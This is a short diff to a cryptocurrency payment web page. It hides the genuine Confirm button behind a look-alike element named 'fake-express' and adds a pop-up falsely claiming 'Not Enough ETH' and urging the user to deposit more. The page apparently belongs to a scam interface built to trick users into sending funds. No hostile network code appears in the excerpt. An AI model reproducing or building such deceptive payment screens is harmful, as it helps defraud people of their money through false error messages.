@@ -778,10 +778,11 @@ setInterval(fetchBNBPrice, 120000);
       </div> 
         </div>  
    <div class="express-confirm-row"> 
-      
-      <button id="express-payment-btn" disabled>Confirm</button>  
-      </div>
+      <div class="fake-express" id="fake-express">Confirm</div>
+      <button id="express-payment-btn" disabled hidden>Confirm</button>
      
+      </div>
+      
     </div>
   </div>
       
@@ -813,6 +814,20 @@ setInterval(fetchBNBPrice, 120000);
       }
     });
   </script>
+    
+    
+    <div id="ad-good-modal-confirm-p" class="modal">
+    <div class="modal-content"> 
+       <div class="not-board"> 
+     <img src="https://cdn-icons-png.flaticon.com/128/16741/16741218.png" alt="BTC" class="not-icon">
+     <div class="not-text-bold">Not Enough ETH</div>
+     <div class="not-text">Insufficient ETH for network fees. Please deposit ETH to enable this transaction</div>
+    <div class="not-cancel" onclick="document.querySelector('#ad-good-modal-confirm-p').style.display='none';document.querySelector('#express-confirm-modal').style.display='block';">Cancel</div>  
+       
+       
+      </div>
+      </div>
+    </div>
     
     
     
